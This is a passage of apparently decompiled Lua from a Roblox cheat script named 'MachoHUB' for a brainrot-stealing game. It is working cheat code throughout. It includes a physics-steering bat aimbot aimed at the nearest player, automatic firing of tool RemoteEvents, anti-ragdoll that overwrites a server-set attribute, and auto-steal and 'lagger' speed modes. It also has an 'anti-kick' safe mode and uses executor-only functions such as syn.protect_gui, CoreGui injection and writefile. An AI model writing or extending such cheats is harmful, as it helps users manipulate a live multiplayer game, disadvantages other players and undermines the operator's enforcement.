	local humanoid = character:FindFirstChildOfClass("Humanoid")
	fn19(humanoid)

	local function fn23(arg2, name)
		local v5 = animate:FindFirstChild(arg2)
		if not v5 then
			return nil
		end
		local animation = v5:FindFirstChild(name)

		if not animation then
			animation = Instance.new("Animation")
			animation.Name = name
			animation.Parent = v5
		end

		return animation
	end

	local walkAnim = v4.WalkAnim
	fn20(fn23("walk", "WalkAnim"), walkAnim)
	local runAnim = v4.RunAnim
	fn20(fn23("run", "RunAnim"), runAnim)
	local jumpAnim = v4.JumpAnim
	fn20(fn23("jump", "JumpAnim"), jumpAnim)
	local fallAnim = v4.FallAnim
	fn20(fn23("fall", "FallAnim"), fallAnim)
	local climbAnim = v4.ClimbAnim
	fn20(fn23("climb", "ClimbAnim"), climbAnim)
	local animation1 = v4.Animation1
	fn20(fn23("idle", "Animation1"), animation1)
	fn20(fn23("idle", "Animation2"), v4.Animation2)

	pcall(function()
		animate.Disabled = true
		task.wait()
		animate.Disabled = false
	end)

	return true
end

findMedusa = function()
	local character = localPlayer.Character
	if not character then
		return nil
	end

	for _, child in ipairs(character:GetChildren()) do
		if child:IsA("Tool") then
			local str3 = child.Name:lower()
			if str3:find("medusa") or str3:find("head") or str3:find("stone") then
				return child
			end
		end
	end

	local backpack = localPlayer:FindFirstChild("Backpack")

	if backpack then
		for _, child in ipairs(backpack:GetChildren()) do
			if child:IsA("Tool") then
				local str3 = child.Name:lower()
				if str3:find("medusa") or str3:find("head") or str3:find("stone") then
					return child
				end
			end
		end
	end

	return nil
end

useMedusaCounter = function()
	if flag9 then
		return
	end

	if n19 > tick() - n6 then
		return
	end
	local character = localPlayer.Character
	if not character then
		return
	end
	flag9 = true
	local v4 = findMedusa()
	if not v4 then
		flag9 = false
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if v4.Parent ~= character and humanoid then
		pcall(function()
			humanoid:EquipTool(v4)
		end)
	end

	pcall(function()
		v4:Activate()
	end)

	pcall(function()
		local remoteEvent = v4:FindFirstChildWhichIsA("RemoteEvent", true)

		if remoteEvent then
			remoteEvent:FireServer()
		end
	end)

	n6 = tick()

	task.defer(function()
		flag9 = false
	end)
end

onAnchorChanged = function(arg)
	return arg:GetPropertyChangedSignal("Anchored"):Connect(function()
		if arg.Anchored and (arg.Transparency >= 0.9 or arg.LocalTransparencyModifier >= 0.9) then
			if flag6 then
				useMedusaCounter()
			end
		end
	end)
end

setupMedusa = function(arg)
	for _, v4 in pairs(tbl25.anchor) do
		pcall(function()
			v4:Disconnect()
		end)
	end

	tbl25.anchor = {}
	if not arg then
		return
	end

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("BasePart") then
			table.insert(tbl25.anchor, onAnchorChanged(descendant))
		end
	end

	table.insert(tbl25.anchor, arg.DescendantAdded:Connect(function(descendant)
		if descendant:IsA("BasePart") then
			table.insert(tbl25.anchor, onAnchorChanged(descendant))
		end
	end))

	table.insert(tbl25.anchor, RunService.Heartbeat:Connect(function()
		if not flag6 or flag9 then
			return
		end

		if not arg or not arg.Parent then
			return
		end

		for _, child in ipairs(arg:GetChildren()) do
			if child:IsA("BasePart") and child.Anchored and (child.Transparency >= 0.9 or child.Name == "HumanoidRootPart") then
				if child.Transparency >= 0.9 then
					useMedusaCounter()
					return
				end
			end
		end
	end))
end

stopMedusaCounter = function()
	for _, v4 in pairs(tbl25.anchor) do
		pcall(function()
			v4:Disconnect()
		end)
	end

	tbl25.anchor = {}
end

local tbl27

tbl27 = {
	blockedTools = {
		bat = true,
		slap = true,
		sword = true,
		gun = true,
		pistol = true,
		rifle = true,
		medusa = true,
		hammer = true,
		axe = true,
		knife = true,
		katana = true,
		blade = true,
		fist = true,
	},
	monitorStarted = false,
	getCountdownLabel = function()
		local ok, result = pcall(function()
			return localPlayer.PlayerGui and localPlayer.PlayerGui:FindFirstChild("DuelsMachineTopFrame") and localPlayer.PlayerGui.DuelsMachineTopFrame:FindFirstChild("DuelsMachineTopFrame") and localPlayer.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame:FindFirstChild("Timer") and localPlayer.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame.Timer:FindFirstChild("Label")
		end)

		return ok and result or nil
	end,
	countdownNumber = function(arg)
		local str3 = tostring(arg or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
		if str3 == "GO" or str3 == "START" or str3 == "READY" then
			return true
		end
		local num = tonumber(str3)
		return num ~= nil and num >= 0 and num <= 10
	end,
	inDuelCountdown = function()
		local v4 = tbl27.getCountdownLabel()
		return v4 and tbl27.countdownNumber(v4.Text) or false
	end,
	isCarryableTool = function(arg)
		if not arg or not arg:IsA("Tool") then
			return false
		end
		local str3 = arg.Name:lower()

		for k in pairs(tbl27.blockedTools) do
			if str3:find(k, 1, true) then
				return false
			end
		end

		return true
	end,
	holdingBrainrot = function()
		local ok, result = pcall(function()
			return localPlayer:GetAttribute("Stealing")
		end)

		if ok and result == true then
			return true
		end

		local ok2, result2 = pcall(function()
			return localPlayer:GetAttribute("AntiKick")
		end)

		if ok2 and result2 == true then
			return true
		end
		local character = localPlayer.Character
		if not character then
			return false
		end

		local ok3, result3 = pcall(function()
			return character:GetAttribute("Stealing")
		end)

		if ok3 and result3 == true then
			return true
		end

		for _, v4 in ipairs({ "Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab" }) do
			local v5 = character:FindFirstChild(v4, true)

			if v5 then
				if v5:IsA("BoolValue") and v5.Value then
					return true
				end

				if v5:IsA("ObjectValue") and v5.Value then
					return true
				end

				if v5:IsA("StringValue") and v5.Value ~= "" then
					return true
				end
			end
		end

		for _, child in ipairs(character:GetChildren()) do
			if child:IsA("Tool") then
				local str3 = child.Name:lower()
				if str3:find("brainrot") or str3:find("skibidi") or str3:find("toilet") then
					return true
				end

				if tbl27.isCarryableTool(child) and (str3:find("animal") or str3:find("pet") or str3:find("rot") or #str3 > 2) then
					if not (str3:find("bat") or str3:find("slap")) then
						str3:find("medusa")
					end
				end
			end

			if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
				local str3 = child.Name:lower()
				if str3:find("brainrot") or str3:find("animal") or str3:find("carry") or str3:find("grab") or str3:find("steal") or str3:find("hold") then
					return true
				end
			end
		end

		return false
	end,
	isLocked = function()
		if not tbl3.antiKick then
			return false
		end
		return tbl27.inDuelCountdown() or tbl27.holdingBrainrot()
	end,
	forceStop = function()
		local flag40 = false

		if flag13 then
			flag13 = false

			if resetAutoBatMotion then
				resetAutoBatMotion()
			end

			if stopBatAimbot then
				stopBatAimbot()
			end

			if autoBatSetVisual then
				autoBatSetVisual(false)
			end

			if tbl6 and tbl6.autoBat then
				tbl6.autoBat(false)
			end

			flag40 = true
		end

		if flag11 then
			flag11 = false

			if stopAutoLeft then
				stopAutoLeft()
			end

			if v then
				v(false)
			end

			if tbl6 and tbl6.autoLeft then
				tbl6.autoLeft(false)
			end

			flag40 = true
		end

		if flag12 then
			flag12 = false

			if stopAutoRight then
				stopAutoRight()
			end

			if v2 then
				v2(false)
			end

			if tbl6 and tbl6.autoRight then
				tbl6.autoRight(false)
			end

			flag40 = true
		end

		if tbl3.tpBat then
			if tbl3.stopTPBat then
				tbl3.stopTPBat()
			end

			if tbl3.setTPBatVisual then
				tbl3.setTPBatVisual(false)
			end

			if tbl6 and tbl6.tpBat then
				tbl6.tpBat(false)
			end

			flag40 = true
		end

		tbl3.brainrot = tbl27.holdingBrainrot()
		return flag40
	end,
	tryStart = function()
		if tbl27.isLocked() then
			tbl27.forceStop("SAFE MODE")
			return false
		end
		return true
	end,
}

tbl3.enableAntiKick = function()
	tbl3.antiKick = true

	if not tbl27.monitorStarted then
		tbl27.monitorStarted = true

		RunService.Heartbeat:Connect(function()
			if tbl3.antiKick and tbl27.isLocked() then
				tbl27.forceStop("SAFE MODE")
			end

			tbl3.brainrot = tbl3.antiKick and tbl27.holdingBrainrot()
		end)
	end

	if tbl27.isLocked() then
		tbl27.forceStop("SAFE MODE")
	end
end

tbl3.disableAntiKick = function()
	tbl3.antiKick = true
end

local tbl28 = {
	"Bat",
	"Slap",
	"Iron Slap",
	"Gold Slap",
	"Diamond Slap",
	"Emerald Slap",
	"Ruby Slap",
	"Dark Matter Slap",
	"Flame Slap",
	"Nuclear Slap",
	"Galaxy Slap",
	"Glitched Slap",
}

findBatForCounter = function()
	local character = localPlayer.Character
	if not character then
		return nil
	end
	local backpack = localPlayer:FindFirstChildOfClass("Backpack")

	for _, v4 in ipairs(tbl28) do
		local v5 = character:FindFirstChild(v4) or backpack and backpack:FindFirstChild(v4)
		if v5 then
			return v5
		end
	end

	for _, child in ipairs(character:GetChildren()) do
		if child:IsA("Tool") and child.Name:lower():find("bat") then
			return child
		end
	end

	if backpack then
		for _, child in ipairs(backpack:GetChildren()) do
			if child:IsA("Tool") and child.Name:lower():find("bat") then
				return child
			end
		end
	end

	return nil
end

swingBatForCounter = function(arg, arg2)
	local humanoid = arg2:FindFirstChildOfClass("Humanoid")

	if arg.Parent ~= arg2 then
		if humanoid then
			pcall(function()
				humanoid:EquipTool(arg)
			end)
		end

		task.wait(0.05)
	end

	local remoteEvent = arg:FindFirstChildOfClass("RemoteEvent") or arg:FindFirstChildOfClass("RemoteFunction")

	if remoteEvent and remoteEvent:IsA("RemoteEvent") then
		pcall(function()
			remoteEvent:FireServer()
		end)

		task.wait(0.15)

		pcall(function()
			remoteEvent:FireServer()
		end)
	else
		pcall(function()
			arg:Activate()
		end)

		task.wait(0.15)

		pcall(function()
			arg:Activate()
		end)
	end
end

startBatCounter = function()
	if tbl25.batCounter then
		return
	end

	tbl25.batCounter = RunService.Heartbeat:Connect(function()
		if not flag7 or flag39 then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid then
			return
		end
		local state = humanoid:GetState()

		if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
			flag39 = true

			task.spawn(function()
				local v4 = findBatForCounter()

				if v4 then
					swingBatForCounter(v4, character)
				end

				task.wait(0.5)
				flag39 = false
			end)
		end
	end)
end

stopBatCounter = function()
	if tbl25.batCounter then
		tbl25.batCounter:Disconnect()
		tbl25.batCounter = nil
	end

	flag39 = false
end

aimbotConn = nil
_predBall = nil

getClosestTarget = function()
	local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return nil
	end
	local huge = math.huge
	local v4 = nil

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= localPlayer and player.Character then
			local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")
			local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

			if humanoidRootPart2 and humanoid and humanoid.Health > 0 then
				local magnitude = (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude

				if magnitude < huge then
					huge = magnitude
					v4 = humanoidRootPart2
				end
			end
		end
	end

	return v4
end

swingCurrentBat = function()
	if not flag18 then
		return
	end
	local v4 = findBat()

	if v4 and v4.Parent == localPlayer.Character and v4:IsA("Tool") then
		pcall(function()
			v4:Activate()
		end)
	end
end

startBatAimbot = function()
	tbl3.tpBat = false

	if tbl3.tpConn then
		pcall(function()
			tbl3.tpConn:Disconnect()
		end)

		tbl3.tpConn = nil
	end

	if tbl3.setTPBatVisual then
		pcall(function()
			tbl3.setTPBatVisual(false)
		end)
	end

	if tbl6 and tbl6.tpBat then
		pcall(function()
			tbl6.tpBat(false)
		end)
	end

	if aimbotConn then
		aimbotConn:Disconnect()
	end

	flag13 = true

	if flag11 then
		flag11 = false

		if v then
			v(false)
		end

		stopAutoLeft()
	end

	if flag12 then
		flag12 = false

		if v2 then
			v2(false)
		end

		stopAutoRight()
	end

	local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.AutoRotate = false
	end

	aimbotConn = RunService.RenderStepped:Connect(function()
		if not flag13 then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return
		end
		local humanoid2 = character:FindFirstChildOfClass("Humanoid")
		if not humanoid2 then
			return
		end

		if not character:FindFirstChildOfClass("Tool") then
			local v4 = findBat()

			if v4 then
				pcall(function()
					humanoid2:EquipTool(v4)
				end)
			end
		end

		local v4 = getClosestTarget()
		if not v4 then
			swingCurrentBat()
			return
		end
		local assemblyLinearVelocity = v4.AssemblyLinearVelocity
		local position = humanoidRootPart.Position
		local position2 = v4.Position
		local n20 = position2 + assemblyLinearVelocity * 0.14 + v4.CFrame.LookVector * 0.3 - position
		local vector = Vector3.new(n20.X, 0, n20.Z)
		local lookVector

		if vector.Magnitude < 0.05 then
			lookVector = humanoidRootPart.CFrame.LookVector
		else
			lookVector = vector.Unit
		end

		local n21 = (position2.Y + 3.7 - position.Y) * 19.5 + assemblyLinearVelocity.Y * 0.8
		local n22

		if humanoid2.FloorMaterial == Enum.Material.Air then
			n22 = n21
		else
			n22 = math.max(n21, 13)
		end

		humanoidRootPart.AssemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity:Lerp(Vector3.new(lookVector.X * 58, math.clamp(n22, -70, 110), lookVector.Z * 58), 0.8)
		local n23 = position2 + assemblyLinearVelocity * math.clamp(assemblyLinearVelocity.Magnitude / 150, 0.05, 0.2)

		if (n23 - position).Magnitude > 0.1 then
			local cframe = CFrame.lookAt(position, n23)
			local v5, v6, v7 = (humanoidRootPart.CFrame:Inverse() * cframe):ToEulerAnglesXYZ()
			humanoidRootPart.AssemblyAngularVelocity = humanoidRootPart.CFrame:VectorToWorldSpace(Vector3.new(math.clamp(v5, -2.5, 2.5) * 42, math.clamp(v6, -2.5, 2.5) * 42, math.clamp(v7, -2.5, 2.5) * 42))
		end

		swingCurrentBat()
	end)

	if autoBatSetVisual then
		autoBatSetVisual(true)
	end

	if tbl6 and tbl6.autoBat then
		tbl6.autoBat(true)
	end
end

stopBatAimbot = function()
	if aimbotConn then
		aimbotConn:Disconnect()
		aimbotConn = nil
	end

	flag13 = false

	if _predBall then
		_predBall:Destroy()
		_predBall = nil
	end

	local character = localPlayer.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

	if humanoidRootPart then
		humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
	end

	character = character and character:FindFirstChildOfClass("Humanoid")

	if character then
		character.AutoRotate = true
	end

	if flag22 then
		startAutoTP()
	end

	if autoBatSetVisual then
		autoBatSetVisual(false)
	end

	if tbl6 and tbl6.autoBat then
		tbl6.autoBat(false)
	end
end

queueAutoBatStart = function()
	if tbl3.tpBat and not tbl3.tpConn then
		tbl3.tpBat = false
	end

	if tbl3.tpBat then
		if tbl3.stopTPBat then
			tbl3.stopTPBat()
		end

		if tbl3.setTPBatVisual then
			tbl3.setTPBatVisual(false)
		end

		if tbl6 and tbl6.tpBat then
			tbl6.tpBat(false)
		end
	end

	if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
		return
	end

	if tbl3.antiKick and tbl3.brainrot then
		return
	end

	if flag11 then
		flag11 = false

		if v then
			v(false)
		end

		stopAutoLeft()
	end

	if flag12 then
		flag12 = false

		if v2 then
			v2(false)
		end

		stopAutoRight()
	end

	startBatAimbot()
end

resetAutoBatMotion = function()
	local character = localPlayer.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	character = character and character:FindFirstChildOfClass("Humanoid")

	if humanoidRootPart then
		humanoidRootPart.AssemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity * 0.3
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
	end

	if character then
		character.AutoRotate = true
	end
end

saveConfig = function()
	local function fn23(arg)
		if arg.kb then
			return { kb = arg.kb.Name, gp = arg.gp and arg.gp.Name }
		end

		if arg.gp then
			return { gp = arg.gp.Name }
		end
		return { kb = nil, gp = nil }
	end

	local function fn24()
		if not _GuiKeys then
			return {}
		end
		local tbl29 = {}

		for k, v4 in pairs(_GuiKeys) do
			if v4 and v4.Name then
				tbl29[k] = v4.Name
			end
		end

		return tbl29
	end

	local function fn25()
		local tbl29 = {}

		for k, v4 in pairs(tbl22) do
			if type(v4) == "table" then
				tbl29[k] = { kb = v4.kb and v4.kb.Name or nil, gp = v4.gp and v4.gp.Name or nil }
			end
		end

		return tbl29
	end

	local tbl29 = {
		normalSpeed = n,
		carrySpeed = n2,
		dropBrainrotKey = fn23(tbl22.DropBrainrot),
		autoLeftKey = fn23(tbl22.AutoLeft),
		autoRightKey = fn23(tbl22.AutoRight),
		autoBatKey = fn23(tbl22.AutoBat),
		laggerToggleKey = fn23(tbl22.LaggerToggle),
		laggerCarryKey = fn23(tbl22.LaggerCarry),
		tpBatKey = fn23(tbl22.TPBat),
		tpFloorKey = fn23(tbl22.TPFloor),
		guiHideKey = fn23(tbl22.GuiHide),
		speedToggleKey = fn23(tbl22.SpeedToggle),
		batV2Key = fn23(tbl22.BatV2),
		grabRadius = tbl23.StealRadius,
		stealDuration = tbl23.StealDuration,
		antiRagdoll = flag4,
		batV2Speed = n7,
		batV2Enabled = flag14,
		mirrorTPDownEnabled = flag15,
		voidThemeName = str,
		autoStealEnabled = tbl23.AutoStealEnabled,
		stealMode = tbl23.Mode,
		stealBarStyle = n14,
		stealBarScale = n15,
		infiniteJump = flag5,
		infJumpMode = str2,
		medusaCounter = flag6,
		batCounter = flag7,
		carrySpeedActive = flag,
		antiDieEnabled = flag3,
		laggerModeEnabled = flag2,
		laggerSpeed = n3,
		laggerCarrySpeed = n4,
		autoBat = flag13,
		aimbotAfterHit = flag16,
		autoSwing = flag18,
		unwalkEnabled = flag8,
		antiLag = flag20,
		stretchRez = flag21,
		autoTPEnabled = flag22,
		autoTPHeight = autoTPHeight,
		guiTransparencyEnabled = flag23,
		mobileButtonsEnabled = flag24,
		MachotextEnabled = MachotextEnabled,
		logoCircleEnabled = visible,
		guiScale = uiScaleValue,
		uiScale = uiScaleValue,
		mobileButtonsLocked = flag25,
		mobileButtonsSize = n13,
		circleButtonsEnabled = flag26,
		autoSwitchSpeed = flag27,
		uiLocked = flag33,
		headlessEnabled = flag29,
		korbloxEnabled = flag30,
		animPackEnabled = flag28,
		animPackName = text2,
		fovValue = fieldOfView,
		perButtonDrag = flag31,
		skyTheme = text,
		antiKick = tbl3.antiKick,
		autoMoveSwing = flag19,
		autoMoveSwingInterval = n12,
		ragdollGui = flag32,
		espEnabled = flag34,
		espAvatarsEnabled = flag35,
		backgroundEnabled = flag36,
		backgroundIndex = n17,
		keys = fn25(),
		keybinds = fn25(),
	}

	if writefile then
		pcall(function()
			writefile("MachoHUB.json", HttpService:JSONEncode(tbl29))
		end)
	end
end

task.spawn(function()
	while task.wait(5) do
		saveConfig()
	end
end)

resetAllSettings = function()
	n = 59
	n2 = 9
	n3 = 30
	n4 = 15
	flag = false
	flag2 = false
	flag3 = true
	flag27 = false
	flag4 = false
	flag5 = false
	str2 = "manual"
	flag6 = false
	flag7 = false
	flag8 = false
	tbl3.antiKick = true

	if tbl3.enableAntiKick then
		tbl3.enableAntiKick()
	end

	flag11 = false
	flag12 = false
	flag13 = false
	flag18 = true
	flag19 = false
	flag22 = false
	autoTPHeight = 20
	flag20 = false
	flag21 = false
	tbl23.AutoStealEnabled = false
	tbl23.StealRadius = 60
	tbl23.StealDuration = 1.3
	flag23 = false
	flag24 = true
	n13 = 80
	uiScaleValue = 1

	if GuiRefs and GuiRefs.outerScale then
		GuiRefs.outerScale.Scale = 1
	end

	flag26 = false
	flag33 = false
	fieldOfView = 80
	n16 = 1
	tbl22.DropBrainrot = { kb = nil, gp = nil }
	tbl22.AutoLeft = { kb = nil, gp = nil }
	tbl22.AutoRight = { kb = nil, gp = nil }
	tbl22.AutoBat = { kb = nil, gp = nil }
	tbl22.TPFloor = { kb = nil, gp = nil }
	tbl22.GuiHide = { kb = nil, gp = nil }
	tbl22.SpeedToggle = { kb = nil, gp = nil }
	tbl22.LaggerToggle = { kb = nil, gp = nil }

	if refreshSpeedModeLabel then
		refreshSpeedModeLabel()
	end

	if tbl6.carrySpeed then
		tbl6.carrySpeed(flag)
	end

	if tbl6.lagger then
		tbl6.lagger(flag2)
	end

	if tbl6.autoLeft then
		tbl6.autoLeft(false)
	end

	if tbl6.autoRight then
		tbl6.autoRight(false)
	end

	if tbl6.autoBat then
		tbl6.autoBat(false)
	end

	stopBatAimbot()
	stopAutoSteal()
	stopAutoLeft()
	stopAutoRight()
	stopAntiRagdoll()
	stopAutoTP()
	stopHoldInfJump()

	if flag21 then
		disableStretchRez()
	end

	if flag20 then
		disableAntiLag()
	end

	saveConfig()
end

setInfJumpVisual = nil
setAntiRagVisual = nil
setMedusaVisual = nil
setUnwalkVisual = nil
local tbl29 = {}

trackConn = function(arg)
	table.insert(tbl29, arg)
	return arg
end

clearPersistentConns = function()
	for _, v4 in ipairs(tbl29) do
		pcall(function()
			v4:Disconnect()
		end)
	end

	tbl29 = {}
end

refreshSpeedModeLabel = function()
	if v3 then
		if flag2 then
			v3.Text = flag and "Lagger Carry" or "Lagger Mode"
		elseif flag then
			v3.Text = "Carry"
		else
			v3.Text = "Normal"
		end
	end

	if laggerModePillRef and laggerModePillRef.pill and laggerModePillRef.dot then
		local pill = laggerModePillRef.pill
		local dot = laggerModePillRef.dot
		local v4 = flag2
		local color2 = Color3.fromRGB(255, 255, 255)
		local color3 = Color3.fromRGB(46, 24, 38)
		local color4 = Color3.fromRGB(180, 150, 165)
		TweenService:Create(pill, TweenInfo.new(0.16, Enum.EasingStyle.Quad), { BackgroundColor3 = v4 and color2 or color3 }):Play()

		TweenService:Create(dot, TweenInfo.new(0.16, Enum.EasingStyle.Back), {
			Position = v4 and UDim2.new(1, -13, 0.5, -5) or UDim2.new(0, 3, 0.5, -5),
			BackgroundColor3 = v4 and Color3.fromRGB(0, 40, 20) or color4,
		}):Play()
	end

	if carryModePillRef and carryModePillRef.pill and carryModePillRef.dot then
		local pill = carryModePillRef.pill
		local dot = carryModePillRef.dot
		local v4 = flag
		local color2 = Color3.fromRGB(255, 255, 255)
		local color3 = Color3.fromRGB(46, 24, 38)
		local color4 = Color3.fromRGB(180, 150, 165)
		TweenService:Create(pill, TweenInfo.new(0.16, Enum.EasingStyle.Quad), { BackgroundColor3 = v4 and color2 or color3 }):Play()

		TweenService:Create(dot, TweenInfo.new(0.16, Enum.EasingStyle.Back), {
			Position = v4 and UDim2.new(1, -13, 0.5, -5) or UDim2.new(0, 3, 0.5, -5),
			BackgroundColor3 = v4 and Color3.fromRGB(0, 40, 20) or color4,
		}):Play()
	end
end

_prevCarryBeforeLagger = false

toggleCarryMode = function()
	if flag2 then
		flag2 = false
	end

	flag = not flag
	refreshSpeedModeLabel()

	if tbl6.carrySpeed then
		tbl6.carrySpeed(flag)
	end

	if tbl6.lagger then
		tbl6.lagger(flag2)
	end

	if tbl6.laggerCarry then
		tbl6.laggerCarry(false)
	end

	if tbl6.laggerNormal then
		tbl6.laggerNormal(false)
	end

	if GuiToggleSetters and GuiToggleSetters.carryMode then
		pcall(function()
			GuiToggleSetters.carryMode(flag)
		end)
	end
end

toggleLaggerMode = function()
	if not flag2 then
		flag2 = true
		flag = false
	elseif flag2 and not flag then
		flag2 = true
		flag = true
	else
		flag2 = false
		flag = false
	end

	refreshSpeedModeLabel()

	if tbl6.laggerCarry then
		tbl6.laggerCarry(flag2 and flag)
	end

	if tbl6.laggerNormal then
		tbl6.laggerNormal(flag2 and not flag)
	end

	if tbl6.carrySpeed then
		tbl6.carrySpeed(flag and not flag2)
	end

	if tbl6.lagger then
		tbl6.lagger(flag2)
	end

	if GuiToggleSetters and GuiToggleSetters.laggerCarry then
		pcall(function()
			GuiToggleSetters.laggerCarry(flag2 and flag)
		end)
	end
end

toggleLaggerCarry = function()
	if flag2 and flag then
		flag2 = false
		flag = false
	else
		flag2 = true
		flag = true
	end

	refreshSpeedModeLabel()

	if tbl6.laggerCarry then
		tbl6.laggerCarry(flag2 and flag)
	end

	if tbl6.laggerNormal then
		tbl6.laggerNormal(flag2 and not flag)
	end

	if tbl6.carrySpeed then
		tbl6.carrySpeed(flag and not flag2)
	end

	if tbl6.lagger then
		tbl6.lagger(flag2)
	end

	if GuiToggleSetters and GuiToggleSetters.laggerCarry then
		pcall(function()
			GuiToggleSetters.laggerCarry(flag2 and flag)
		end)
	end
end

speedToggleAction = function()
end

startAntiRagdoll = function()
	if tbl25.antiRag then
		return
	end

	tbl25.antiRag = RunService.Heartbeat:Connect(function()
		if not flag4 then
			return
		end
		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not (humanoid and humanoidRootPart) then
			return
		end
		local state = humanoid:GetState()
		local flag40 = state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
		local attribute = localPlayer:GetAttribute("RagdollEndTime")

		if attribute and attribute - workspace:GetServerTimeNow() > 0 then
			flag40 = true
		end

		if flag40 then
			pcall(function()
				localPlayer:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
			end)

			for _, descendant in ipairs(character:GetDescendants()) do
				if descendant:IsA("BallSocketConstraint") or descendant:IsA("Attachment") and descendant.Name:find("RagdollAttachment") then
					descendant:Destroy()
				end
			end

			for _, descendant in ipairs(character:GetDescendants()) do
				if descendant:IsA("Motor6D") and descendant.Enabled == false then
					descendant.Enabled = true
				end
			end

			if humanoid.Health > 0 then
				humanoid:ChangeState(Enum.HumanoidStateType.Running)
			end

			workspace.CurrentCamera.CameraSubject = humanoid
			humanoidRootPart.Anchored = false
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		end
	end)
end

stopAntiRagdoll = function()
	if tbl25.antiRag then
		tbl25.antiRag:Disconnect()
		tbl25.antiRag = nil
	end
end

startUnwalk = function()
	local character = localPlayer.Character
	if not character then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		for _, v4 in ipairs(humanoid:GetPlayingAnimationTracks()) do
			v4:Stop()
		end
	end

	local animate = character:FindFirstChild("Animate")

	if animate then
		unwalkSavedAnimate = animate:Clone()
		animate:Destroy()
	end
end

stopUnwalk = function()
	local character = localPlayer.Character

	if character and unwalkSavedAnimate then
		unwalkSavedAnimate:Clone().Parent = character
		unwalkSavedAnimate = nil
	end
end

createStealBar = function()
	for _, v4 in ipairs({ "MoveeStealBar" }) do
		local v5 = game:GetService("CoreGui"):FindFirstChild(v4)

		if v5 then
			v5:Destroy()
		end

		local playerGui = localPlayer:FindFirstChild("PlayerGui")

		if playerGui then
			local v6 = playerGui:FindFirstChild(v4)

			if v6 then
				v6:Destroy()
			end
		end
	end

	local color2 = Color3.fromRGB(230, 235, 240)
	local color3 = Color3.fromRGB(10, 12, 14)
	local n20 = tonumber(n14) or 2

	if n20 ~= 1 and n20 ~= 2 then
		n20 = 2
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MoveeStealBar"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 8

	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(screenGui)
		end
	end)

	if not pcall(function()
		screenGui.Parent = game:GetService("CoreGui")
	end) then
		screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
	end

	local textLabel, frame, uiGradient

	if n20 == 1 then
		local n21 = math.clamp(tonumber(n15) or 1, 0.7, 1.8)
		local n22 = math.floor(64 * n21 + 0.5)
		local n23 = math.floor(220 * n21 + 0.5)
		local n24 = math.floor(28 * n21 + 0.5)
		local color4 = Color3.fromRGB(230, 235, 240)
		local color5 = Color3.fromRGB(10, 12, 14)
		stealBarFrame = Instance.new("Frame", screenGui)
		stealBarFrame.Size = UDim2.new(0, n22, 0, n23)
		stealBarFrame.Position = UDim2.new(0, 300, 0.5, -n23 / 2)
		stealBarFrame.BackgroundColor3 = color5
		stealBarFrame.BorderSizePixel = 0
		stealBarFrame.ZIndex = 20
		stealBarFrame.ClipsDescendants = true
		stealBarFrame.Visible = true
		stealBarFrame.Active = true
		Instance.new("UICorner", stealBarFrame).CornerRadius = UDim.new(0, math.floor(18 * n21 + 0.5))
		local uiStroke = Instance.new("UIStroke", stealBarFrame)
		uiStroke.Color = color4
		uiStroke.Thickness = 2
		uiStroke.Transparency = 0.3

		task.defer(function()
			pcall(function()
				local outer = GuiRefs and GuiRefs.outer

				if outer and outer.Parent then
					local absolutePosition = outer.AbsolutePosition
					local absoluteSize = outer.AbsoluteSize
					local n25 = absolutePosition.X + absoluteSize.X + 12
					local n26 = absolutePosition.Y + absoluteSize.Y * 0.5 - n23 * 0.5
					local floor = math.floor
					stealBarFrame.Position = UDim2.new(0, math.floor(n25), 0, floor(n26))
				end
			end)
		end)

		local frame2 = Instance.new("Frame", stealBarFrame)
		frame2.Size = UDim2.new(1, 0, 1, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(12, 14, 16)
		frame2.BackgroundTransparency = 0.4
		frame2.BorderSizePixel = 0
		frame2.ZIndex = 20
		frame2.ClipsDescendants = true
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, math.floor(18 * n21 + 0.5))
		local frame3 = Instance.new("Frame", stealBarFrame)
		frame3.Size = UDim2.new(0, n24, 0, n24)
		frame3.Position = UDim2.new(0.5, -n24 / 2, 0, math.floor(8 * n21 + 0.5))
